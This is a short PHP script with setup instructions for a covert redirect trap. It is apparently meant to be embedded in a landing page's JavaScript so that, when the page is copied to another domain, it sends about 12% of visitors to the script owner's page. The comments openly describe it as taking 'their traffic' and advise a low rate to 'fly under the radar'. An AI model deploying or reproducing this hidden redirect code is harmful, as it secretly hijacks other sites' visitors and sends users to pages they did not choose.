<?php
$referringDomain = $_SERVER['HTTP_REFERER'];
$myDomain = 'YOUR-LANDING-PAGE-BASE-DOMAIN.COM';

// INSTRUCTIONS
// 
// 1. Replace 'YOUR-LANDING-PAGE-BASE-DOMAIN.COM' (above) with the BASE domain your lander is on
// 2. Replace 'http://yourdomain.com/cha-ching.html' (below) with your desired landing page before going live
//
// You can use the included cha-ching.html file on your own domain to test before going live,
// just be sure that you point 'http://yourdomain.com/cha-ching.html' (below) to cha-ching.html on your server
// and do NOT set $myDomain (above) to your domain while testing (to simulate the effect on mismatch domains)

function percentChance($chance){
  // Notice we go from 0-99 - therefore a percentChance value (defined below) of 100 will take ALL their traffic
  // If you want to "fly under the radar" you should keep this value well under 15 (it is set to 12% by default)
  $randPercent = mt_rand(0,99);
  return $chance > $randPercent;
}

if(percentChance(12)){
  if ( preg_match("($myDomain)i", $referringDomain, $matches) == false ) {
// their domain doesn't match - output redirect javascript (xx% of the time, as defined above)
?>
window.top.location.href='http://yourdomain.com/cha-ching.html';
<?
Die();
} else {
// OR, it is your domain and nothing happens
}
  
}




?>